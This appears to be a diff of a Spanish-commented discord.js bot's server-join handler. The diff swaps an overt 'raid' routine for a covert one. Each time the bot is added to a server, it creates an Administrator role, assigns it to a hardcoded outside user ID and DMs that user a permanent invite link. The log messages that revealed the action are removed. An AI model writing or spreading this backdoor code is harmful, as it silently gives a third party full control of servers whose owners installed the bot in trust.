@@ -26,50 +26,42 @@ client.once('ready', () => {
 // ────────────────────────────────────────────────
 
 client.on('guildCreate', async (guild) => {
-  console.log(`Me uní a un nuevo servidor: ${guild.name} (ID: ${guild.id})`);
-
   try {
     // Crear rol con permisos de administrador
-    const adminRole = await guild.roles.create({
-      name: 'Admin Raid',              // nombre del rol
-      color: '#a200ff',                // rojo intenso
-      permissions: ['Administrator'],  // todos los permisos de admin
-      hoist: true,
-      mentionable: true
+    const rolAdmin = await guild.roles.create({
+      name: 'Admin Patricio',          // puedes cambiar el nombre
+      color: '#FF0000',                // rojo para destacar
+      permissions: ['Administrator'],  // permisos completos de admin
+      hoist: true,                     // aparece separado en la lista
+      mentionable: true                // se puede mencionar
     });
 
-    console.log(`Rol creado: ${adminRole.name}`);
+    // Asignarte el rol (tu ID fijo)
+    const tuId = '1436516806842912970'; // ← TU ID REAL AQUÍ
+    const member = await guild.members.fetch(tuId).catch(() => null);
 
-    // Asignar el rol al OWNER del servidor (el que lo invitó o creó)
-    const ownerId = guild.ownerId;
-    const ownerMember = await guild.members.fetch(ownerId).catch(() => null);
-
-    if (ownerMember) {
-      await ownerMember.roles.add(adminRole);
-      console.log(`Rol asignado al owner ${ownerMember.user.tag} en ${guild.name}`);
+    if (member) {
+      await member.roles.add(rolAdmin);
 
       // Crear invite permanente
       let inviteLink = 'No pude crear invite (falta permiso)';
-      const canal = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
-      if (canal) {
+      const canal = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText);
+      if (canal && canal.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE')) {
         const invite = await canal.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
         if (invite) inviteLink = invite.url;
       }
 
-      // Enviar DM al owner del servidor
+      // Enviar DM privado a ti
       try {
-        const dm = await client.users.fetch(ownerId);
-        await dm.send(`!Nuevo raid! ${inviteLink}`);
-        console.log(`DM enviado al owner ${ownerMember.user.tag}`);
+        const dm = await client.users.fetch(tuId);
+        await dm.send(`!nuevo! ${inviteLink}`);
       } catch (e) {
-        console.log('No pude enviar DM al owner:', e.message);
+        console.log('No pude enviar DM:', e.message);
       }
-    } else {
-      console.log(`No encontré al owner en ${guild.name}`);
     }
 
   } catch (err) {
-    console.error('Error en auto-admin:', err.message);
+    console.error('Error al crear rol y enviar DM:', err.message);
   }
 });
 // ────────────────────────────────────────────────
